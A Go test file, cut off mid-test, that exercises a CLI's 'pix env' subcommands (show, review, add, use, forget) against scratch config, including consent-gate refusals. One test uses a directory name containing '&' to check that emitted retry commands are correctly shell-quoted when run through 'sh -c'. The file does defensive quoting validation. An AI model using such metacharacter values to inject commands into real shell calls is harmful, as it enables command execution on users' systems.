package main

// env_cmd_test.go proves `pix env` end to end through the SAME kong entry
// point (dispatch) production uses, against scratch $PIX_CONFIG/
// $XDG_STATE_HOME so a run never touches a real user's config or trust
// store (workflow/env's review/ls/show all read the environment trust
// store beside config.toml and lock in the state dir — review_test.go's
// tempConfigAndState documents the same two-var isolation this file needs).

import (
	"bytes"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"pix/host/cli"
	"pix/host/config"
	"pix/host/sandbox"
	"pix/host/sys"
	"pix/host/sys/systest"
	"pix/host/workflow/env"
)

func envDeps(t *testing.T) (*cli.Deps, *bytes.Buffer, *bytes.Buffer) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	return freshDeps()
}

// freshDeps builds a new *cli.Deps with empty buffers over whatever
// $PIX_CONFIG/$XDG_STATE_HOME are ALREADY set to — for a second dispatch
// within a test that must keep reading the same scratch config/trust
// store envDeps just isolated, rather than rolling a brand new one.
func freshDeps() (*cli.Deps, *bytes.Buffer, *bytes.Buffer) {
	var out, errb bytes.Buffer
	return &cli.Deps{Out: &out, Err: &errb, In: strings.NewReader("")}, &out, &errb
}

// registerFixtureEnv copies src (a directory holding an authored
// `.sbxenv.yaml` and optional `pix.toml`) into a fresh root, registers it
// under name against the current scratch $PIX_CONFIG, and saves it —
// this file's equivalent of workflow/env's copyFixture/Register pair,
// reachable here only through config.Config directly, since registration
// has no verb yet (E1.10 owns `add`).
func registerFixtureEnv(t *testing.T, src, name string) string {
	t.Helper()
	root := t.TempDir()
	entries, err := os.ReadDir(src)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		data, err := os.ReadFile(filepath.Join(src, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, e.Name()), data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	canon, err := cfg.AddEnvironment(name, root)
	if err != nil {
		t.Fatal(err)
	}
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}
	return canon
}

// registerTier0Env registers name against a minimal, non-host-executing
// `.sbxenv.yaml` (no mcp/secrets/host.services) — the shape `env show`'s
// default screen exercises without pulling in review's gate machinery.
func registerTier0Env(t *testing.T, name string) string {
	t.Helper()
	src := t.TempDir()
	doc := "schemaVersion: \"1\"\nagent: pix\n"
	if err := os.WriteFile(filepath.Join(src, ".sbxenv.yaml"), []byte(doc), 0o644); err != nil {
		t.Fatal(err)
	}
	return registerFixtureEnv(t, src, name)
}

// registerHostExecEnv registers name against the shared Tier1 fixture
// (workflow/env/testdata/hostexec-fixture), so `env review` has a real
// host-executing bill to render.
func registerHostExecEnv(t *testing.T, name string) string {
	t.Helper()
	src := filepath.Join("..", "..", "workflow", "env", "testdata", "hostexec-fixture")
	return registerFixtureEnv(t, src, name)
}

// registerEnvWithLocalSkill registers name against a fresh root declaring a
// LOCAL `[pi].skills` entry at a relative path under root ("./skills") —
// the E1.9 BLOCK regression fixture: `env show`/`env review` supply no
// caller EffectiveMounts at all (env_cmd.go's own nil), so this only
// succeeds when Load itself validates the skill against its own implicit,
// read-only environment-root workspace.
func registerEnvWithLocalSkill(t *testing.T, name string) string {
	t.Helper()
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "skills"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, ".sbxenv.yaml"), []byte("schemaVersion: \"1\"\nagent: pix\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "pix.toml"), []byte("schema = 1\n\n[pi]\nskills = [\"./skills\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	canon, err := cfg.AddEnvironment(name, root)
	if err != nil {
		t.Fatal(err)
	}
	if err := cfg.Save(); err != nil {
		t.Fatal(err)
	}
	return canon
}

// ── bare `pix env` is `env ls` ───────────────────────────────────────────

func TestEnvBareIsLs(t *testing.T) {
	d, out, errb := envDeps(t)
	if code := dispatch([]string{"env"}, d); code != 0 {
		t.Fatalf("pix env = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), "built-in defaults") {
		t.Errorf("bare `pix env` on an empty registry = %q, want it to behave like `env ls`", out.String())
	}

	d2, out2, errb2 := envDeps(t)
	registerTier0Env(t, "work")
	if code := dispatch([]string{"env"}, d2); code != 0 {
		t.Fatalf("pix env = %d, want 0 (stderr: %s)", code, errb2.String())
	}
	if !strings.Contains(out2.String(), "work") {
		t.Errorf("bare `pix env` after registering work = %q, want the ls listing", out2.String())
	}

	// The explicit spelling, over the SAME registered environment, renders
	// identically — proving `env` and `env ls` are the same dispatch, not
	// two renderers that happen to agree today.
	d3, out3, errb3 := freshDeps()
	if code := dispatch([]string{"env", "ls"}, d3); code != 0 {
		t.Fatalf("pix env ls = %d, want 0 (stderr: %s)", code, errb3.String())
	}
	if out3.String() != out2.String() {
		t.Errorf("`env` = %q, `env ls` = %q, want them identical", out2.String(), out3.String())
	}
}

// ── env show: no selection -> exit 0, names `none` ───────────────────────

func TestEnvShow_NoSelection(t *testing.T) {
	d, out, errb := envDeps(t)
	if code := dispatch([]string{"env", "show"}, d); code != 0 {
		t.Fatalf("pix env show (no selection) = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), "none") {
		t.Errorf("env show with no selection = %q, want it to name `none`", out.String())
	}
}

func TestEnvShow_NoSelectionJSON(t *testing.T) {
	d, out, errb := envDeps(t)
	if code := dispatch([]string{"env", "show", "--json"}, d); code != 0 {
		t.Fatalf("pix env show --json (no selection) = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), `"environment": "none"`) {
		t.Errorf("env show --json with no selection = %q, want environment \"none\" (AC-46)", out.String())
	}
}

// ── env show --path: byte-exact canonical path + newline ────────────────

func TestEnvShow_PathByteExact(t *testing.T) {
	d, out, errb := envDeps(t)
	root := registerTier0Env(t, "work")
	if code := dispatch([]string{"env", "show", "work", "--path"}, d); code != 0 {
		t.Fatalf("pix env show work --path = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if got, want := out.String(), root+"\n"; got != want {
		t.Errorf("env show work --path = %q, want %q byte-exact", got, want)
	}
}

func TestEnvShow_PathWithNoSelectionRefuses(t *testing.T) {
	d, _, errb := envDeps(t)
	code := dispatch([]string{"env", "show", "--path"}, d)
	if code != 2 {
		t.Fatalf("pix env show --path (no selection) = %d, want 2", code)
	}
	if !strings.Contains(errb.String(), "select one: pix env show") {
		t.Errorf("stderr = %q, want the runnable-command line", errb.String())
	}
}

// ── env show: unknown exact name ──────────────────────────────────────────

func TestEnvShow_UnknownNameExact(t *testing.T) {
	d, _, errb := envDeps(t)
	code := dispatch([]string{"env", "show", "hoem"}, d)
	if code != 2 {
		t.Fatalf("pix env show hoem = %d, want 2", code)
	}
	got := errb.String()
	if !strings.Contains(got, `no environment named "hoem"`) {
		t.Errorf("stderr = %q, want the unknown-name form", got)
	}
	if strings.Contains(got, "pix: pix:") {
		t.Errorf("stderr = %q, must never double-prefix \"pix: \"", got)
	}
}

// ── env show --effective: declared, not yet available (D8) ──────────────

func TestEnvShow_EffectiveNotYetAvailable(t *testing.T) {
	d, _, errb := envDeps(t)
	registerTier0Env(t, "work")
	code := dispatch([]string{"env", "show", "work", "--effective"}, d)
	if code == 0 || code == 2 {
		t.Fatalf("pix env show work --effective = %d, want a non-zero, non-2 operational code", code)
	}
	if !strings.Contains(errb.String(), "not yet available") {
		t.Errorf("stderr = %q, want it to say not yet available", errb.String())
	}
	if strings.Contains(errb.String(), "pix: pix:") {
		t.Errorf("stderr = %q, must never double-prefix \"pix: \"", errb.String())
	}
	if strings.Contains(errb.String(), "E2.1") {
		t.Errorf("stderr = %q, must never name the internal unit E2.1", errb.String())
	}
}

// ── env show: --path/--json/--effective are mutually exclusive ──────────

func TestEnvShow_FlagsMutuallyExclusive(t *testing.T) {
	for _, argv := range [][]string{
		{"env", "show", "work", "--path", "--json"},
		{"env", "show", "work", "--path", "--effective"},
		{"env", "show", "work", "--json", "--effective"},
	} {
		d, _, errb := envDeps(t)
		if code := dispatch(argv, d); code != 2 {
			t.Errorf("dispatch(%v) = %d, want 2 (usage refusal)", argv, code)
		}
		got := errb.String()
		if !strings.Contains(got, "mutually exclusive") {
			t.Errorf("dispatch(%v) stderr = %q, want a mutually-exclusive refusal", argv, got)
		}
		// C6: no doubled "pix: " prefix (dispatch's own generic printer must
		// never re-add it on top of the family's own self-prefixed message).
		if strings.Contains(got, "pix: pix:") {
			t.Errorf("dispatch(%v) stderr = %q, must never double-prefix \"pix: \"", argv, got)
		}
		// valid modes are DATA (one line), never three separate command lines.
		if !strings.Contains(got, "valid: --path, --json, --effective") {
			t.Errorf("dispatch(%v) stderr = %q, want the valid modes listed as data", argv, got)
		}
		// exactly one runnable retry, naming the actual NAME given.
		if want := "retry: pix env show work"; !strings.Contains(got, want) {
			t.Errorf("dispatch(%v) stderr = %q, want %q", argv, got, want)
		}
		if n := strings.Count(got, "pix env show work"); n != 1 {
			t.Errorf("dispatch(%v) stderr = %q, want exactly one runnable command, got %d", argv, got, n)
		}
	}

	// No NAME given: the retry uses the `<name>` placeholder, never an empty
	// or malformed command.
	d, _, errb := envDeps(t)
	code := dispatch([]string{"env", "show", "--path", "--json"}, d)
	if code != 2 {
		t.Fatalf("dispatch = %d, want 2", code)
	}
	if want := "retry: pix env show <name>"; !strings.Contains(errb.String(), want) {
		t.Errorf("stderr = %q, want %q", errb.String(), want)
	}
}

// ── env review: dispatches E1.8 with real roots/TTY/PATH lookup ─────────

func TestEnvReview_NonTTYFailsClosed(t *testing.T) {
	d, out, errb := envDeps(t)
	d.Interactive = false
	registerHostExecEnv(t, "work")

	code := dispatch([]string{"env", "review", "work"}, d)
	if code != 2 {
		t.Fatalf("pix env review work (non-TTY) = %d, want 2 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), "Accept this host-execution footprint?") {
		t.Errorf("stdout = %q, want the review bill", out.String())
	}
	if !strings.Contains(errb.String(), "pix env review work --yes") {
		t.Errorf("stderr = %q, want the --yes re-run command", errb.String())
	}
}

// TestEnvReview_NonTTYFailsClosed_MergedStreamNeverGluesPromptToError proves
// item 3's fix at the real dispatch layer: when stdout and stderr share ONE
// underlying writer (exactly what a real terminal session shows, one stream
// after another), the bill's trailing consent prompt and the refusal
// error's own "pix: " line must never run together as a single glued
// line — exactly one newline separates them, matching the same blank line
// the interactive TTY branch already prints before it reads an answer.
func TestEnvReview_NonTTYFailsClosed_MergedStreamNeverGluesPromptToError(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
	var merged bytes.Buffer
	d := &cli.Deps{Out: &merged, Err: &merged, In: strings.NewReader(""), Interactive: false}
	registerHostExecEnv(t, "work")

	code := dispatch([]string{"env", "review", "work"}, d)
	if code != 2 {
		t.Fatalf("pix env review work (non-TTY) = %d, want 2 (merged: %s)", code, merged.String())
	}
	got := merged.String()
	if strings.Contains(got, "[y/N]:pix:") {
		t.Errorf("merged stdout+stderr glues the consent prompt straight to the error, want a newline between them, got:\n%q", got)
	}
	const boundary = "Accept this host-execution footprint? [y/N]:"
	i := strings.Index(got, boundary)
	if i < 0 {
		t.Fatalf("merged output missing the consent prompt, got:\n%s", got)
	}
	after := got[i+len(boundary):]
	if !strings.HasPrefix(after, "\npix: ") {
		t.Errorf("want exactly one newline then the error's own \"pix: \" prefix immediately after the prompt, got %q", after)
	}
}

func TestEnvReview_YesAccepts(t *testing.T) {
	d, out, errb := envDeps(t)
	registerHostExecEnv(t, "work")

	code := dispatch([]string{"env", "review", "work", "--yes"}, d)
	if code != 0 {
		t.Fatalf("pix env review work --yes = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), `recorded acceptance for environment "work"`) {
		t.Errorf("stdout = %q, want the acceptance line", out.String())
	}

	// `env show work` now reports it accepted, over the SAME scratch
	// config/trust store `env review --yes` just wrote to.
	d2, out2, errb2 := freshDeps()
	if code := dispatch([]string{"env", "show", "work"}, d2); code != 0 {
		t.Fatalf("pix env show work = %d, want 0 (stderr: %s)", code, errb2.String())
	}
	if !strings.Contains(out2.String(), "accepted") {
		t.Errorf("env show after review --yes = %q, want it to report accepted", out2.String())
	}
}

// ── E1.9 BLOCK: full dispatch with a local sidecar skill under root ──────

// TestEnvShow_WithLocalSidecarSkillSucceeds proves `pix env show` — which
// supplies no writable workspace at all pre-E2 — still succeeds for an
// environment declaring a LOCAL skill under its own root, through the SAME
// kong dispatch production uses.
func TestEnvShow_WithLocalSidecarSkillSucceeds(t *testing.T) {
	d, out, errb := envDeps(t)
	registerEnvWithLocalSkill(t, "work")
	if code := dispatch([]string{"env", "show", "work"}, d); code != 0 {
		t.Fatalf("pix env show work (local sidecar skill under root) = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), "pix.toml") {
		t.Errorf("env show work = %q, want it to list pix.toml as an authored file", out.String())
	}
}

// TestEnvReview_WithLocalSidecarSkillSucceeds proves the same for `pix env
// review`: this fixture is Tier0 (no host-exec facet), so it succeeds
// silently with no gate, but only once Load's own skill validation passes.
func TestEnvReview_WithLocalSidecarSkillSucceeds(t *testing.T) {
	d, out, errb := envDeps(t)
	d.Interactive = false
	registerEnvWithLocalSkill(t, "work")
	if code := dispatch([]string{"env", "review", "work"}, d); code != 0 {
		t.Fatalf("pix env review work (local sidecar skill under root) = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if out.String() != "" {
		t.Errorf("env review work (Tier0) = %q, want no output at all", out.String())
	}
}

// ── env add: E1.10, dispatched through the SAME kong entry point ──────────

// tier0Source/tier1Source build the same two authored-file shapes
// registerTier0Env/registerHostExecEnv register directly, but as a bare
// SOURCE DIRECTORY `env add` itself must register — `add` has no verb yet
// to bypass in these tests, unlike every earlier env_cmd_test.go helper.
func tier0Source(t *testing.T) string {
	t.Helper()
	src := t.TempDir()
	if err := os.WriteFile(filepath.Join(src, ".sbxenv.yaml"), []byte("schemaVersion: \"1\"\nagent: pix\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	return src
}

func tier1Source(t *testing.T) string {
	t.Helper()
	src := t.TempDir()
	fixture := filepath.Join("..", "..", "workflow", "env", "testdata", "hostexec-fixture")
	entries, err := os.ReadDir(fixture)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		data, err := os.ReadFile(filepath.Join(fixture, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(src, e.Name()), data, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return src
}

func TestEnvAdd_RegisterTier0(t *testing.T) {
	d, out, errb := envDeps(t)
	root := tier0Source(t)
	if code := dispatch([]string{"env", "add", "work", root}, d); code != 0 {
		t.Fatalf("pix env add work %s = %d, want 0 (stderr: %s)", root, code, errb.String())
	}
	if !strings.Contains(out.String(), "pix env use work") {
		t.Errorf("stdout = %q, want it to name `pix env use work`", out.String())
	}

	d2, out2, errb2 := freshDeps()
	if code := dispatch([]string{"env", "show", "work", "--path"}, d2); code != 0 {
		t.Fatalf("pix env show work --path = %d, want 0 (stderr: %s)", code, errb2.String())
	}
	if strings.TrimSpace(out2.String()) == "" {
		t.Error("env show work --path after add is empty; add must have registered and saved it")
	}
}

func TestEnvAdd_RegisterTier1_NonTTYFailsClosedTransactionally(t *testing.T) {
	d, out, errb := envDeps(t)
	d.Interactive = false
	root := tier1Source(t)

	code := dispatch([]string{"env", "add", "work", root}, d)
	if code != 2 {
		t.Fatalf("pix env add work %s (non-TTY) = %d, want 2 (stdout: %s, stderr: %s)", root, code, out.String(), errb.String())
	}
	if !strings.Contains(out.String(), "Accept this host-execution footprint?") {
		t.Errorf("stdout = %q, want the review bill", out.String())
	}

	// Nothing was registered: a fresh `env show work` still reports unknown.
	d2, _, errb2 := freshDeps()
	if code := dispatch([]string{"env", "show", "work"}, d2); code != 2 {
		t.Fatalf("pix env show work after a refused add = %d, want 2", code)
	}
	if !strings.Contains(errb2.String(), `no environment named "work"`) {
		t.Errorf("stderr = %q, want the unknown-name form (nothing was registered)", errb2.String())
	}
}

// extractRetryLine pulls C7's labeled `retry: ...` line out of a refusal's
// text — the ONE runnable next command the review-gate family now carries
// entirely in the error, never a second, output-only line.
func extractRetryLine(t *testing.T, text string) string {
	t.Helper()
	for _, line := range strings.Split(text, "\n") {
		if s, ok := strings.CutPrefix(strings.TrimSpace(line), "retry: "); ok {
			return s
		}
	}
	t.Fatalf("no `retry: ...` line found in:\n%s", text)
	return ""
}

// shellTokenize proves a retry command is actually POSIX-shell-quoted, not
// merely printf-formatted to look that way: it hands cmd to a REAL `sh -c`
// (via `set --`) and reads back argv exactly as a shell would expand it,
// rather than reimplementing shell-word-splitting by hand in the test.
func shellTokenize(t *testing.T, cmd string) []string {
	t.Helper()
	script := "set -- " + cmd + "\nfor a in \"$@\"; do printf '%s\\000' \"$a\"; done"
	out, err := exec.Command("sh", "-c", script).Output()
	if err != nil {
		t.Fatalf("sh -c tokenize %q: %v", cmd, err)
	}
	trimmed := strings.TrimSuffix(string(out), "\x00")
	if trimmed == "" {
		return nil
	}
	return strings.Split(trimmed, "\x00")
}

// TestEnvAdd_NonTTYRetryCommandIsShellTokenizableAndRedispatchSucceeds is
// C7's own proof, not merely a golden string match: `pix env add NAME PATH`
// against a Tier1 fixture whose PATH needs real POSIX quoting (a space and
// a shell metacharacter) refuses non-interactively, its emitted `retry:`
// command survives a REAL `sh -c` tokenization back into the exact
// NAME/PATH argv pair, and re-dispatching that argv (a fresh, unregistered
// process-equivalent run) actually SUCCEEDS — the whole point of an
// origin-appropriate retry over the bare `pix env review NAME` this used
// to (wrongly) print, which would have failed with an unknown-name
// refusal since NAME was never registered by the first, refused attempt.
func TestEnvAdd_NonTTYRetryCommandIsShellTokenizableAndRedispatchSucceeds(t *testing.T) {
	d, _, errb := envDeps(t)
	d.Interactive = false

	parent := t.TempDir()
	root := filepath.Join(parent, "needs quoting & stuff")
	if err := os.Mkdir(root, 0o755); err != nil {
		t.Fatal(err)
	}
	fixture := filepath.Join("..", "..", "workflow", "env", "testdata", "hostexec-fixture")
	entries, err := os.ReadDir(fixture)
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		data, err := os.ReadFile(filepath.Join(fixture, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, e.Name()), data, 0o644); err != nil {
			t.Fatal(err)
		}
	}

	code := dispatch([]string{"env", "add", "work", root}, d)
	if code != 2 {
		t.Fatalf("pix env add work %q (non-TTY) = %d, want 2 (stderr: %s)", root, code, errb.String())
	}
	if strings.Contains(errb.String(), "pix env review work") {
		t.Errorf("stderr = %q, must never point at `pix env review work`: NAME is not registered yet, so that command would itself fail", errb.String())
	}

	retry := extractRetryLine(t, errb.String())
	if !strings.Contains(retry, "--yes") {
		t.Errorf("retry command %q, want the --yes non-interactive form", retry)
	}
	argv := shellTokenize(t, retry)
	if len(argv) < 2 || argv[0] != "pix" {
		t.Fatalf("retry command %q did not tokenize to a `pix ...` argv: %v", retry, argv)
	}

	d2, out2, errb2 := freshDeps()
	if code := dispatch(argv[1:], d2); code != 0 {
		t.Fatalf("re-dispatch of retry command %q (argv %v) = %d, want 0 (stdout: %s, stderr: %s)", retry, argv, code, out2.String(), errb2.String())
	}
	if !strings.Contains(out2.String(), `recorded acceptance for environment "work"`) {
		t.Errorf("re-dispatch stdout = %q, want the acceptance line", out2.String())
	}
}

func TestEnvAdd_RegisterTier1_YesAccepts(t *testing.T) {
	d, out, errb := envDeps(t)
	root := tier1Source(t)
	if code := dispatch([]string{"env", "add", "work", root, "--yes"}, d); code != 0 {
		t.Fatalf("pix env add work %s --yes = %d, want 0 (stderr: %s)", root, code, errb.String())
	}
	if !strings.Contains(out.String(), `recorded acceptance for environment "work"`) {
		t.Errorf("stdout = %q, want the acceptance line", out.String())
	}
	if !strings.Contains(out.String(), "pix env use work") {
		t.Errorf("stdout = %q, want it to name `pix env use work`", out.String())
	}
}

// TestEnvAdd_ZeroPathScaffoldsUnderDataDir proves the zero-path form end to
// end through dispatch: cwd genuinely has no `.sbxenv.yaml` (a scratch temp
// dir this test os.Chdir's into and restores afterward — the ONE test in
// this file that does, since envAddCmd.Run wires no Getwd override:
// production always resolves the real cwd).
func TestEnvAdd_ZeroPathScaffoldsUnderDataDir(t *testing.T) {
	d, out, errb := envDeps(t)
	t.Setenv("XDG_DATA_HOME", t.TempDir())

	oldwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	cwd := t.TempDir()
	if err := os.Chdir(cwd); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(oldwd) })

	if code := dispatch([]string{"env", "add", "home"}, d); code != 0 {
		t.Fatalf("pix env add home (scaffold) = %d, want 0 (stderr: %s)", code, errb.String())
	}
	firstLine, _, _ := strings.Cut(out.String(), "\n")
	if !filepath.IsAbs(firstLine) {
		t.Errorf("first output line = %q, want an absolute created root", firstLine)
	}
	if !strings.Contains(firstLine, filepath.Join("pix", "envs", "home")) {
		t.Errorf("first output line = %q, want it under <data-dir>/envs/home", firstLine)
	}
	if _, err := os.Stat(filepath.Join(firstLine, ".sbxenv.yaml")); err != nil {
		t.Errorf("scaffolded .sbxenv.yaml missing at %s: %v", firstLine, err)
	}
	if !strings.Contains(out.String(), "pix env use home") {
		t.Errorf("stdout = %q, want it to name `pix env use home`", out.String())
	}
}

// TestEnvAdd_ZeroPathCwdAmbiguityRefusesNamingBothForms proves D10 through
// dispatch: a real cwd that already holds `.sbxenv.yaml` refuses a
// zero-path add outright.
func TestEnvAdd_ZeroPathCwdAmbiguityRefusesNamingBothForms(t *testing.T) {
	d, _, errb := envDeps(t)
	t.Setenv("XDG_DATA_HOME", t.TempDir())

	oldwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	cwd := t.TempDir()
	if err := os.WriteFile(filepath.Join(cwd, ".sbxenv.yaml"), []byte("schemaVersion: \"1\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chdir(cwd); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(oldwd) })

	code := dispatch([]string{"env", "add", "home"}, d)
	if code != 2 {
		t.Fatalf("pix env add home (cwd has .sbxenv.yaml) = %d, want 2", code)
	}
	got := errb.String()
	if !strings.Contains(got, "pix env add home "+cwd) {
		t.Errorf("stderr = %q, want it to name the register form", got)
	}
	if !strings.Contains(got, "pix env add home") {
		t.Errorf("stderr = %q, want it to name the bare scaffold form", got)
	}
}

// ── env use ───────────────────────────────────────────────────────────────

func TestEnvUse_Tier0Succeeds(t *testing.T) {
	d, out, errb := envDeps(t)
	registerTier0Env(t, "home")

	if code := dispatch([]string{"env", "use", "home"}, d); code != 0 {
		t.Fatalf("pix env use home = %d, want 0 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(out.String(), `"home" is now the default`) {
		t.Errorf("stdout = %q, want the default-set success line", out.String())
	}

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Environment != "home" {
		t.Errorf("config.Environment = %q, want %q", cfg.Environment, "home")
	}
}

func TestEnvUse_UnreviewedTier1Refuses(t *testing.T) {
	d, _, errb := envDeps(t)
	registerHostExecEnv(t, "work")

	code := dispatch([]string{"env", "use", "work"}, d)
	if code != 2 {
		t.Fatalf("pix env use work (unreviewed) = %d, want 2 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(errb.String(), "pix env review work") {
		t.Errorf("stderr = %q, want it to name `pix env review work`", errb.String())
	}
	if strings.Contains(errb.String(), "pix: pix:") {
		t.Errorf("stderr = %q, must never double-prefix \"pix: \"", errb.String())
	}

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Environment != "" {
		t.Errorf("a refused `env use` must never set the default; config.Environment = %q", cfg.Environment)
	}
}

func TestEnvUse_ReviewedThenChangedRefuses(t *testing.T) {
	d, _, errb := envDeps(t)
	registerHostExecEnv(t, "work")
	if code := dispatch([]string{"env", "review", "work", "--yes"}, d); code != 0 {
		t.Fatalf("pix env review work --yes = %d, want 0 (stderr: %s)", code, errb.String())
	}

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	root, ok := env.Root(cfg, "work")
	if !ok {
		t.Fatal("work must be registered")
	}
	sbxenvPath := filepath.Join(root, ".sbxenv.yaml")
	data, err := os.ReadFile(sbxenvPath)
	if err != nil {
		t.Fatal(err)
	}
	rewritten := strings.Replace(string(data),
		"    - name: warehouse-mcp\n      command: warehouse-mcp-server\n",
		"    - name: warehouse-mcp\n      command: warehouse-mcp-server\n    - name: extra-mcp\n      command: extra-mcp-server\n",
		1)
	if rewritten == string(data) {
		t.Fatal("test setup error: fixture .sbxenv.yaml did not match the expected replace target")
	}
	if err := os.WriteFile(sbxenvPath, []byte(rewritten), 0o644); err != nil {
		t.Fatal(err)
	}

	d2, _, errb2 := freshDeps()
	code := dispatch([]string{"env", "use", "work"}, d2)
	if code != 2 {
		t.Fatalf("pix env use work (changed since review) = %d, want 2 (stderr: %s)", code, errb2.String())
	}
	if !strings.Contains(errb2.String(), "changed") || !strings.Contains(errb2.String(), "pix env review work") {
		t.Errorf("stderr = %q, want it to say changed and name `pix env review work`", errb2.String())
	}
}

func TestEnvUse_ConfigMutationIsOnlyTheEnvironmentKey(t *testing.T) {
	d, _, errb := envDeps(t)
	registerTier0Env(t, "home")
	before, err := os.ReadFile(config.Path())
	if err != nil {
		t.Fatal(err)
	}

	if code := dispatch([]string{"env", "use", "home"}, d); code != 0 {
		t.Fatalf("pix env use home = %d, want 0 (stderr: %s)", code, errb.String())
	}
	after, err := os.ReadFile(config.Path())
	if err != nil {
		t.Fatal(err)
	}

	inBefore := map[string]bool{}
	for _, l := range strings.Split(string(before), "\n") {
		inBefore[l] = true
	}
	var added []string
	for _, l := range strings.Split(string(after), "\n") {
		if strings.TrimSpace(l) == "" || inBefore[l] {
			continue
		}
		added = append(added, l)
	}
	if len(added) != 1 || !strings.HasPrefix(added[0], "environment") {
		t.Fatalf("config diff lines = %v, want exactly one `environment = ...` line added", added)
	}
}

// ── env forget ────────────────────────────────────────────────────────────

func TestEnvForget_SucceedsAndLeavesSourceByteIdentical(t *testing.T) {
	d, out, errb := envDeps(t)
	root := registerTier0Env(t, "home")
	sentinel := filepath.Join(root, ".sbxenv.yaml")
	before, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatal(err)
	}

	if code := dispatch([]string{"env", "forget", "home"}, d); code != 0 {
		t.Fatalf("pix env forget home = %d, want 0 (stderr: %s)", code, errb.String())
	}
	got := out.String()
	if !strings.Contains(got, `"home"`) || !strings.Contains(got, root) {
		t.Errorf("stdout = %q, want it to name the environment and the surviving root %s", got, root)
	}
	if strings.Contains(got, "removed") || strings.Contains(got, "deleted") {
		t.Errorf("stdout = %q, must never say removed/deleted", got)
	}

	after, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatalf("source file must survive forget: %v", err)
	}
	if string(after) != string(before) {
		t.Errorf("source bytes changed: before %q, after %q", before, after)
	}

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := cfg.Environments["home"]; ok {
		t.Error("home must no longer be registered after forget")
	}
}

func TestEnvForget_CurrentDefaultRefuses(t *testing.T) {
	d, _, errb := envDeps(t)
	registerTier0Env(t, "home")
	if code := dispatch([]string{"env", "use", "home"}, d); code != 0 {
		t.Fatalf("pix env use home = %d, want 0 (stderr: %s)", code, errb.String())
	}

	d2, _, errb2 := freshDeps()
	code := dispatch([]string{"env", "forget", "home"}, d2)
	if code != 2 {
		t.Fatalf("pix env forget home (current default) = %d, want 2 (stderr: %s)", code, errb2.String())
	}
	if !strings.Contains(errb2.String(), "current default") {
		t.Errorf("stderr = %q, want it to name the current-default refusal", errb2.String())
	}

	cfg, err := config.Load()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := cfg.Environments["home"]; !ok {
		t.Error("a refused forget must leave the registration in place")
	}
	if cfg.Environment != "home" {
		t.Errorf("config.Environment = %q, want unchanged %q", cfg.Environment, "home")
	}
}

func TestEnvForget_UnknownNameRefuses(t *testing.T) {
	d, _, errb := envDeps(t)
	code := dispatch([]string{"env", "forget", "hoem"}, d)
	if code != 2 {
		t.Fatalf("pix env forget hoem = %d, want 2 (stderr: %s)", code, errb.String())
	}
	if !strings.Contains(errb.String(), `no environment named "hoem"`) {
		t.Errorf("stderr = %q, want the unknown-name form", errb.String())
	}
}

// ── pix env rm: pointer error, not a working alias ───────────────────────

func TestEnvRm_IsAPointerErrorWithZeroMutation(t *testing.T) {
	envDeps(t)
	root := registerTier0Env(t, "home")
	beforeConfig, err := os.ReadFile(config.Path())
	if err != nil {
		t.Fatal(err)
	}
	sentinel := filepath.Join(root, ".sbxenv.yaml")
	beforeSource, err := os.ReadFile(sentinel)
	if err != nil {
		t.Fatal(err)
	}

	// The dynamic pointer names whatever NAME the invocation actually typed
	// (this file's own rmPointerName): a bare `pix env rm` has none at all
	// and falls back to rmPointerFallbackName ("NAME"), while `home` or
	// `--force home` both name "home" — rmPointerName skips the leading
	// flag-shaped token to find it.
	for _, tc := range []struct {
		argv []string
		want string
	}{
